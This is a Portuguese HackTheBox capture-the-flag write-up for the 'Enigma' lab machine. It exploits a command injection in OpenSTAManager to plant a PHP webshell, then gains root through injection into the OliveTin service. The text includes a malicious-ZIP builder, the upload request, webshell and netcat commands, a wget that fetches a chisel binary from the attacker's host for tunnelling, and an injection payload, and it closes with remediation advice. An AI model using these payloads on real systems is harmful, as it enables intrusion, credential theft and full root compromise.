# HTB Enigma — Writeup

## Objetivo

Obter acesso inicial, escalar privilégios até um usuário local e, por fim, comprometer root na máquina Linux "Enigma" (HackTheBox, dificuldade Easy), documentando o processo completo de enumeração, exploração e pós-exploração.

## Target/Lab Context

- **Plataforma**: HackTheBox, máquina ranked semanal
- **Nome**: Enigma
- **Dificuldade**: Easy
- **SO**: Linux (Ubuntu, kernel 6.8.0-124-generic)
- **IP**: 10.129.28.49 (variou durante a sessão devido a reset de instância)
- **Tema**: Aplicação de gestão empresarial (OpenSTAManager) com serviços de email (Dovecot) e orquestração de tarefas administrativas (OliveTin)

Pontos de atenção imediatos:
- SSH exposto, mas tentativa inicial de login (`ssh sara@10.129.28.49`) retornou `Permission denied (publickey)` — sinal de que autenticação por senha estava desabilitada desde o início, embora isso só tenha sido confirmado formalmente mais tarde, ao inspecionar `/etc/ssh/sshd_config` (`PasswordAuthentication no`).
- Pilha de email completa (POP3/IMAP, com e sem TLS) sugeria um vetor de email/credenciais relevante para o resto da máquina.
- NFS aberto na 2049, export visível mais tarde como `/srv/nfs/onboarding` (somente leitura — não explorável via técnica clássica de `no_root_squash`).

### Enumeração de subdomínios/vhosts

Reconhecimento adicional revelou vhosts não óbvios a partir do escopo HTB:

```
enigma.htb
mail001.enigma.htb
support_001.enigma.htb
```

`support_001.enigma.htb` hospedava um painel administrativo do **OpenSTAManager**, identificado posteriormente como versão **2.9.8** (confirmado via token de API exposto, que incluía a versão e hash de commit: `Version 2.9.8 (5ff39df9b)`).

Acesso administrativo ao painel foi obtido nesta fase (credenciais/token específicos não detalhados nos logs revisados — ponto de atenção para reforço de documentação em sessões futuras).

## Vulnerabilidade

**CVE-2025-69212** — OS Command Injection no OpenSTAManager (≤ 2.9.8), no módulo de processamento de arquivos P7M (Fatura Eletrônica assinada digitalmente).

### Causa raiz

Arquivo `src/Util/XML.php`, função `decodeP7M()`:

```php
public static function decodeP7M($file)
{
    $directory = pathinfo($file, PATHINFO_DIRNAME);
    $output_file = $directory.'/'.basename($file, '.p7m');
    exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
}
```

O parâmetro `$file` — derivado do nome de um arquivo dentro de um ZIP enviado pelo usuário — é concatenado diretamente dentro de uma chamada `exec()`, sem uso de `escapeshellarg()` ou qualquer sanitização. Como o nome do arquivo é inteiramente controlado pelo atacante (definido no momento da criação do ZIP), é possível escapar das aspas duplas do comando shell e injetar comandos arbitrários.

### Pré-requisitos

- Usuário autenticado com acesso à funcionalidade de importação de Fatura Eletrônica (módulo `importFE_ZIP`).

## Metodologia

1. Reconhecimento de portas e serviços via Nmap.
2. Identificação de vhosts adicionais (`support_001.enigma.htb`) fora do domínio principal.
3. Acesso ao painel administrativo do OpenSTAManager.
4. Identificação da versão exata (2.9.8) via token de API exposto na interface.
5. Pesquisa de CVEs públicos para a versão identificada — múltiplos candidatos encontrados (SQLi em `ajax_complete.php`, XSS refletido, deserialização insegura em OAuth2), mas o **OS Command Injection via P7M** foi escolhido como vetor primário por ser diretamente relacionado à funcionalidade de upload já em teste manual, e por oferecer RCE direto sem etapas intermediárias.
6. Construção de ZIP malicioso explorando a injeção no nome de arquivo.
7. Upload via requisição HTTP autenticada ao endpoint de importação.
8. Confirmação de RCE e estabelecimento de shell reverso.
9. Enumeração pós-exploração como `www-data`.
10. Extração de credenciais de banco de dados a partir de `config.inc.php`.
11. Dump da tabela de usuários (`zz_users`) via acesso direto ao MySQL.
12. Identificação de hash bcrypt do usuário `haris`.
13. Obtenção da senha em texto plano (`bestfriends`) — processo exato não documentado com precisão (ver Lições Aprendidas).
14. Escalada para `haris` via `su`.
15. Leitura da flag de usuário.
16. Enumeração de privilégios (`sudo -l` negado, sem grupos privilegiados, sem SUID binaries incomuns).
17. Descoberta do serviço **OliveTin** (orquestrador de automação) rodando como root, vinculado apenas a `127.0.0.1:1337`.
18. Leitura do arquivo de configuração `/etc/OliveTin/config.yaml`, revelando uma action `Backup Database` que interpola parâmetros de usuário (`db_user`, `db_pass`, `db_name`) diretamente em um comando `mysqldump` via shell, sem sanitização.
19. Necessidade de acessar o serviço local (porta 1337, bind apenas em loopback) a partir da máquina atacante — tentativa de túnel via SSH falhou devido a `PasswordAuthentication no` no `sshd_config` do alvo.
20. Pivô para tunelamento via **chisel** (reverse tunnel), contornando a restrição de SSH.
21. Identificação do formato correto do payload JSON esperado pela API gRPC-gateway do OliveTin, por tentativa e erro estruturado (formato de `arguments` como array de objetos `{name, value}`).
22. Injeção de comando via campo `db_pass`.
23. Confirmação de execução como root e leitura da flag de root.

## Exploração

### Etapa 1 — RCE inicial via OS Command Injection (P7M)

Construção do ZIP malicioso (nome de arquivo não pode conter `/`, pois `ZipArchive::extractTo()` quebra nomes nesse caractere):

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > shell.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

Upload via requisição multipart autenticada:

```http
POST /actions.php HTTP/1.1
Host: support_001.enigma.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: PHPSESSID=<sessão admin>

------WebKitFormBoundary
Content-Disposition: form-data; name="blob1"; filename="exploit.zip"
Content-Type: application/zip

[conteúdo do ZIP]
------WebKitFormBoundary
Content-Disposition: form-data; name="op"

save
------WebKitFormBoundary--
```

Resposta HTTP 500 (esperada — o erro de parsing XML ocorre *depois* da execução do comando):

```json
{"error":{"type":"Exception","message":"Start tag expected, '<' not found"}}
```

Webshell criado com sucesso:

```bash
curl "http://support_001.enigma.htb/files/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Estabelecimento de shell reverso via listener netcat e payload PHP equivalente, seguido de upgrade de TTY:

```bash
nc -lvnp 4444
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Etapa 3 — RCE como root via OliveTin

Identificação do serviço local:

```bash
ps aux | grep -i olivetin
cat /proc/<pid>/cmdline | tr '\0' '\n'
# /usr/local/bin/OliveTin
```

Tunelamento da porta local 1337 via chisel (SSH descartado por `PasswordAuthentication no`):

Na máquina atacante:
```bash
chisel server -p 8000 --reverse
python3 -m http.server 9090 --directory /tmp/serve
```

No alvo (shell como haris):
```bash
wget http://10.10.14.28:9090/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.28:8000 R:1337:127.0.0.1:1337 &
```

Payload de injeção de comando contra a API REST do OliveTin (`StartAction`), após identificação do formato correto via tentativa estruturada (a API usa gRPC-gateway/protojson, que exige `arguments` como array de objetos com `name`/`value`, não um objeto chave-valor simples):

```python
import requests

payload = {
    "actionId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "x'; id > /tmp/pwned.txt; echo 'x"},
        {"name": "db_name", "value": "production"}
    ]
}

r = requests.post("http://127.0.0.1:1337/api/v1/StartAction", json=payload)
print(r.text)
```

Verificação de execução como root e leitura da flag final através de injeção subsequente direcionada a um arquivo de saída legível.

## Resultado

- Acesso inicial: `www-data` via RCE (OS Command Injection)
- Usuário: `haris` (UID 1000)
- Root: confirmado via `id` retornando `uid=0` através da injeção de comando no OliveTin

## Evidências

- Hash bcrypt do usuário `haris` extraído do banco de dados (documentado acima)
- Resposta HTTP 500 do endpoint de upload confirmando execução do payload P7M antes da falha de parsing
- Saída de `id` confirmando `uid=33(www-data)` no primeiro acesso e `uid=0` após exploração do OliveTin

**Nota de transparência**: nem todas as etapas desta sessão foram capturadas em screenshot ou log persistente no momento da execução, especialmente a etapa exata de obtenção da senha em texto plano do `haris`. Esse é um ponto de melhoria de processo documentado na seção de Lições Aprendidas.

## Lições Aprendidas

1. **Múltiplos CVEs coexistindo na mesma versão de software** exigem priorização baseada no vetor mais direto para o objetivo (RCE), não necessariamente o primeiro encontrado ou o de maior CVSS.
2. **Reuso de credenciais entre camadas (DB, sistema operacional, email) é um padrão recorrente** em CTFs e em ambientes reais mal configurados — sempre testar credenciais encontradas contra todos os serviços disponíveis (SSH, su, IMAP/POP3, painéis web).
3. **Restrições de SSH (apenas chave pública) não impedem tunelamento** — ferramentas como `chisel` ou `socat` permitem expor portas internas sem depender do serviço SSH do alvo.
4. **APIs baseadas em gRPC-gateway/protojson têm formatos de serialização mais rígidos** que JSON REST convencional; erros de parsing genéricos (`unexpected token`) geralmente indicam estrutura incorreta do payload, não apenas erro de sintaxe — vale inspecionar o binário/frontend da aplicação para confirmar o schema exato antes de iterar por tentativa e erro extensiva.
5. **Documentação em tempo real é mais confiável que reconstrução posterior**: nesta sessão, o método exato de obtenção da senha do `haris` não pôde ser confirmado com certeza após o fato, mesmo com sucesso técnico da máquina. Processo de logging contínuo (`script` ou `tmux pipe-pane`) deve ser parte do setup inicial de qualquer engajamento, não uma etapa posterior.

## Mitigação/Remediação

- **OS Command Injection (P7M)**: nunca interpolar dados controlados pelo usuário diretamente em chamadas `exec()`/`shell_exec()`. Usar `escapeshellarg()` no mínimo, ou preferencialmente evitar invocação de binários externos via shell quando bibliotecas nativas de verificação PKCS#7 estão disponíveis. Validar nomes de arquivo dentro de ZIPs contra uma whitelist de caracteres (`^[a-zA-Z0-9._-]+$`) antes de qualquer processamento.
- **Exposição de credenciais de banco em arquivo de configuração**: restringir permissões de leitura de `config.inc.php` ao mínimo necessário; considerar uso de variáveis de ambiente ou cofres de segredo (vault) em vez de arquivos PHP em texto plano dentro do webroot.
- **Reuso de senha entre serviços**: aplicar políticas de senha únicas por sistema/serviço, especialmente entre credenciais de aplicação (DB) e credenciais de usuário do sistema operacional.
- **OliveTin — Command Injection via template**: nunca usar interpolação de string (`{{ variavel }}`) para montar comandos shell a partir de input de usuário. Preferir execução via array de argumentos sem interpretação de shell, com validação estrita de tipo e conteúdo de cada parâmetro antes da execução.
- **Exposição de serviço administrativo sensível mesmo em loopback**: ainda que vinculado a `127.0.0.1`, o OliveTin executava ações como root sem autenticação local adicional (apesar de `authLocalUsers` estar disponível na configuração, não estava habilitado com usuários reais) — qualquer processo ou usuário capaz de alcançar a porta localmente (incluindo via tunelamento) herda controle total como root.

## Notas Finais

Esta máquina destacou a importância de tratar a fase de escalada de privilégio como uma investigação multi-camada (configuração de aplicação → banco de dados → reuso de credenciais → serviços administrativos internos), em vez de buscar um único exploit linear. O maior gargalo de tempo não foi a identificação da vulnerabilidade em si, mas a depuração do formato exato de payload exigido por uma API gRPC-gateway pouco documentada — reforçando o valor de inspecionar artefatos do lado cliente (JavaScript do frontend, binário do serviço) quando a documentação pública é insuficiente.
